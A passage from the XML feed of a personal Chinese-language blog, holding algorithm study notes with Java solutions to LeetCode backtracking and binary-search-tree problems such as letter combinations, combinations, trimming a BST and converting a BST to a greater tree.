title="思路分析"></a>思路分析</h5><p>首先明确，当对字符串进行修改的时候需要使用<strong>StringBuffer</strong>和<strong>StringBuilder类</strong>.<br>和String类不同的是<strong>上述两者的对象能够多次被修改且不产生新的对象</strong>.<br><strong>StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类.（虽然StringBuilder线程不安全）</strong><br>题目给的是电话号码，数字和字母要对应上，那么自然想到使用Map进行映射存储.<br>特殊的0和1（好奇妙的二进制原来电话也是有设计的！bushi 发上癫了）我们置为空即可.<br>那么此时关键点已经变成了如何在此题中找到我们之前使用的”n”和”k”.<br><img src="/../imgs/2024-10/image-20241125202438310.png" alt="image-20241125202438310"><br>按上图分析我们需要的深度就是传入参数的长度，广度就是固定好的字符个数（也就是3）这俩必要参数确定好之后再来一个记录当前遍历位置的指针即可.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//存储结果</span></span><br><span class="line">    List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">letterCombinations</span><span class="params">(String digits)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(digits == <span class="literal">null</span> || digits.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//存储需要的值</span></span><br><span class="line">        String[] numStr = &#123;<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;abc&quot;</span>, <span class="string">&quot;def&quot;</span>, <span class="string">&quot;ghi&quot;</span>, <span class="string">&quot;jkl&quot;</span>, <span class="string">&quot;mno&quot;</span>, <span class="string">&quot;pqrs&quot;</span>, <span class="string">&quot;tuv&quot;</span>, <span class="string">&quot;wxyz&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//回溯</span></span><br><span class="line">        backtracking(digits,numStr,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//使用效率高的builder</span></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//str表示当前num对应的字符串</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(String digits,String[] numStr,<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(num == digits.length()) &#123;</span><br><span class="line">            res.add(tmp.toString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> numStr[digits.charAt(num) - <span class="string">&#x27;0&#x27;</span>];</span><br><span class="line">    <span class="comment">//注意是单独的集合 判断 如&quot;23&quot; 结果是ab</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            tmp.append(str.charAt(i));</span><br><span class="line">            backtracking(digits, numStr, num + <span class="number">1</span>);</span><br><span class="line">            tmp.deleteCharAt(tmp.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><ul><li>res.add(sb.toString());&#96; 用于将当前构建的字母组合添加到结果列表中。</li><li><code>tmp.append(str.charAt(i));</code> 用于将当前字符添加到 <code>tmp</code> 中，以构建当前的字母组合。</li><li><code>String str = numString[digits.charAt(num) - &#39;0&#39;];</code> 用于将输入字符串中的字符转换为对应的数字，并获取该数字对应的字母字符串。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;组合总和III&quot;&gt;&lt;a href=&quot;#组合总和III&quot; class=&quot;headerlink&quot; title=&quot;组合总和III&quot;&gt;&lt;/a&gt;组合总和III&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/combina</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x17</title>
    <link href="https://yubut.github.io/2024/11/21/yub%E3%81%AEAlgorithm.0x17/"/>
    <id>https://yubut.github.io/2024/11/21/yub%E3%81%AEAlgorithm.0x17/</id>
    <published>2024-11-21T03:05:18.000Z</published>
    <updated>2024-11-25T09:44:21.256Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探回溯"><a href="#初探回溯" class="headerlink" title="初探回溯"></a>初探回溯</h4><h5 id="什么是回溯算法"><a href="#什么是回溯算法" class="headerlink" title="什么是回溯算法"></a>什么是回溯算法</h5><p>回溯算法是一种暴力<strong>穷举</strong>的<strong>搜索方式</strong>.<br>回溯和递归是相辅相承的**.(有递归就会有回溯)**</p><h5 id="回溯法解决的问题"><a href="#回溯法解决的问题" class="headerlink" title="回溯法解决的问题"></a>回溯法解决的问题</h5><ul><li>组合问题：N个数里面按一定规则找出k个数的集合.</li><li>切割问题：一个字符串按一定规则有几种切割方式.</li><li>子集问题：一个N个数的集合里有多少符合条件的子集.</li><li>排列问题：N个数按一定规则全排列，有几种排列方式.</li><li>棋盘问题：N皇后，解数独等.</li></ul><h5 id="使用回溯算法解决问题的思路"><a href="#使用回溯算法解决问题的思路" class="headerlink" title="使用回溯算法解决问题的思路"></a>使用回溯算法解决问题的思路</h5><p>虽然回溯算法暴力效率低下理解起来更为抽象，但好在天无绝人之路，<strong>回溯算法</strong>的问题都可以用<strong>树形结构</strong>来进行理解.</p><hr><p>关键有以下两点：<br><strong>1.集合大小-&gt;树的宽度</strong><br><strong>2.递归深度-&gt;树的深度</strong><br><img src="/../imgs/2024-10/image-20241121153238086.png" alt="image-20241121153238086"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void backtracking(参数) &#123;</span><br><span class="line">    if (终止条件) &#123;</span><br><span class="line">        存放结果;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (选择：本层集合中元素（树中节点孩子的数量就是集合的大小）) &#123;</span><br><span class="line">        处理节点;</span><br><span class="line">        backtracking(路径，选择列表); // 递归</span><br><span class="line">        回溯，撤销处理结果</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="组合问题"><a href="#组合问题" class="headerlink" title="组合问题"></a>组合问题</h4><p>link：<a href="https://leetcode.cn/problems/combinations/description/">77. 组合 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>进入到回溯算法的学习！</p><p>首先明确是在求组合，<strong>组合中的元素是不能重复的</strong>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt;  result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combine</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        backtracking(n,k,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k,<span class="type">int</span> startIndex)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(path.size() == k)</span><br><span class="line">        &#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//for循环</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            path.add(i);</span><br><span class="line">            backtracking(n,k,i+<span class="number">1</span>);</span><br><span class="line">            path.remove(path.size()-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优化思路</strong><br>当我们n&#x3D;k时，第一层for循环再往后遍历就没有意义了.（因为我们最终要取的数的数量要满足，从第二层开始往后的for循环其实已经自动减少了集合中的子集数量，显然这是不符合预期的）<br>以下引用<strong>代码随想录</strong>分析图<br><img src="/../imgs/2024-10/image-20241121150939192.png" alt="image-20241121150939192"></p><p><strong>优化部分</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>已经选择的元素个数：path.size();</span><br><span class="line"><span class="number">2.</span>还需要的元素个数为: k - path.size();</span><br><span class="line"><span class="number">3.</span>在集合n中至多要从该起始位置 : n - (k - path.size()) + <span class="number">1</span>，开始遍历</span><br></pre></td></tr></table></figure><p><strong>优化之后的for循环代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt;= n - (k - path.size()) + <span class="number">1</span>; i++)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt;  result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combine</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        backtracking(n,k,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k,<span class="type">int</span> startIndex)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(path.size() == k)</span><br><span class="line">        &#123;</span><br><span class="line">         <span class="comment">//new ArrayList(path)，创建了 path 的一个副本</span></span><br><span class="line">   <span class="comment">//这意味着即使后续对 path 的修改也不会影响到 result 中已经保存的组合</span></span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//for循环</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;i &lt;= n - (k - path.size()) + <span class="number">1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            path.add(i);</span><br><span class="line">            backtracking(n,k,i+<span class="number">1</span>);</span><br><span class="line">            path.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探回溯&quot;&gt;&lt;a href=&quot;#初探回溯&quot; class=&quot;headerlink&quot; title=&quot;初探回溯&quot;&gt;&lt;/a&gt;初探回溯&lt;/h4&gt;&lt;h5 id=&quot;什么是回溯算法&quot;&gt;&lt;a href=&quot;#什么是回溯算法&quot; class=&quot;headerlink&quot; title=&quot;什么是</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x16</title>
    <link href="https://yubut.github.io/2024/11/20/yub%E3%81%AEAlgorithm.0x16/"/>
    <id>https://yubut.github.io/2024/11/20/yub%E3%81%AEAlgorithm.0x16/</id>
    <published>2024-11-20T08:10:25.000Z</published>
    <updated>2024-11-20T11:12:38.942Z</updated>
    
    <content type="html"><![CDATA[<h4 id="修建二叉搜索树"><a href="#修建二叉搜索树" class="headerlink" title="修建二叉搜索树"></a>修建二叉搜索树</h4><p>link：<a href="https://leetcode.cn/problems/trim-a-binary-search-tree/description/">669. 修剪二叉搜索树 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>注意修剪的时候要考虑到全部的节点，即搜到到限定区间小于左值或者大于右值时还需要检查当前不符合区间大小节点的右子树&#x2F;左子树，不能直接返回null.<br>剪去节点只需要在判断当前节点左&#x2F;右子树后将root的左&#x2F;右节点更新即可.<br><img src="/../imgs/2024-10/image-20241120163837657.png" alt="image-20241120163837657"></p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">trimBST</span><span class="params">(TreeNode root, <span class="type">int</span> low, <span class="type">int</span> high)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val &lt; low) &#123;</span><br><span class="line">            <span class="keyword">return</span> trimBST(root.right,low,high);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val &gt; high) &#123;</span><br><span class="line">            <span class="keyword">return</span> trimBST(root.left,low,high);</span><br><span class="line">        &#125;</span><br><span class="line">        root.left = trimBST(root.left,low,high);</span><br><span class="line">        root.right = trimBST(root.right,low,high);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="将有序数组转化为平衡二叉树"><a href="#将有序数组转化为平衡二叉树" class="headerlink" title="将有序数组转化为平衡二叉树"></a>将有序数组转化为平衡二叉树</h4><p>link：<a href="https://leetcode.cn/problems/convert-sorted-array-to-binary-search-tree/description/">108. 将有序数组转换为二叉搜索树 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>给了升序数组其实一开始想的也是第一个参数是左子树最左边的值，然后去选中间节点做切割.<br>具体就需要怎么在偶数和奇数参数个数下都适配，其实偶数情况无非是选取中间的两个数（left + (right - left) &#x2F; 2）.</p><p>题目给的输入输出示例其实也已经帮我们提供了两种思路.<br><img src="/../imgs/2024-10/image-20241120170337011.png" alt="image-20241120170337011"></p><h6 id="递归-双指针"><a href="#递归-双指针" class="headerlink" title="递归+双指针"></a>递归+双指针</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//采用左闭右闭区间</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">sortedArrayToBST</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> sort(nums,<span class="number">0</span>,nums.length - <span class="number">1</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(left &gt; right) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + ((right - left) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(nums[mid]);</span><br><span class="line">        root.left = sort(nums,left,mid - <span class="number">1</span>);</span><br><span class="line">        root.right = sort(nums,mid + <span class="number">1</span>,right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="把二叉搜索树转换为累加树"><a href="#把二叉搜索树转换为累加树" class="headerlink" title="把二叉搜索树转换为累加树"></a>把二叉搜索树转换为累加树</h4><p>link：<a href="https://leetcode.cn/problems/convert-bst-to-greater-tree/description/">538. 把二叉搜索树转换为累加树 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>第一遍看题目还有点没看明白（挠头.jpg<br>其实就是对于树中的每个节点，计算它的值加上树中所有大于该节点值的节点的值.但是保证搜索二叉树的定义，那就是左子树的节点值必须小于节点的值，右子树的节点值必须大于节点的值.那我们就从右子树入手，<strong>反向中序遍历（右根左)<strong>，</strong>确保累加时考虑了所有大于当前节点的值.</strong><br>和上一题相同的思路.</p><h6 id="递归-双指针-1"><a href="#递归-双指针-1" class="headerlink" title="递归+双指针"></a>递归+双指针</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">convertBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        travsal(root);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">travsal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// 如果当前节点为空，直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    travsal(root.right);  <span class="comment">// 先遍历右子树</span></span><br><span class="line">    root.val += pre;      <span class="comment">// 将当前节点的值加上pre</span></span><br><span class="line">    pre = root.val;       <span class="comment">// 更新pre为当前节点的新值</span></span><br><span class="line">    travsal(root.left);   <span class="comment">// 再遍历左子树</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;修建二叉搜索树&quot;&gt;&lt;a href=&quot;#修建二叉搜索树&quot; class=&quot;headerlink&quot; title=&quot;修建二叉搜索树&quot;&gt;&lt;/a&gt;修建二叉搜索树&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/trim-a-</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x15.</title>
    <link href="https://yubut.github.io/2024/11/18/yub%E3%81%AEAlgorithm.0x15/"/>
    <id>https://yubut.github.io/2024/11/18/yub%E3%81%AEAlgorithm.0x15/</id>
    <published>2024-11-18T02:04:14.000Z</published>
    <updated>2024-11-18T06:12:00.638Z</updated>
    
    <content type="html"><![CDATA[<h4 id="二叉搜索树的最近公共祖先"><a href="#二叉搜索树的最近公共祖先" class="headerlink" title="二叉搜索树的最近公共祖先"></a>二叉搜索树的最近公共祖先</h4><p>link：<a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree/">235. 二叉搜索树的最近公共祖先 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>题目给出的是二叉搜索树，那就方便很多.（<strong>不用在意遍历顺序</strong>）<br>已知左子树的值都比根节点小，右子树的值都比根节点大（每层都符合该规律）但是由于不知道p、q的值哪个比根节点大所以需要进行比较.<br>我们在递归的时候只需要不断缩小判断区间即可.<br>怎么缩小呢？<br>和p、q的值进行比较即可.</p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//缩小 确定范围在左子树</span></span><br><span class="line">        <span class="keyword">if</span>(root.val &gt; p.val &amp;&amp; root.val 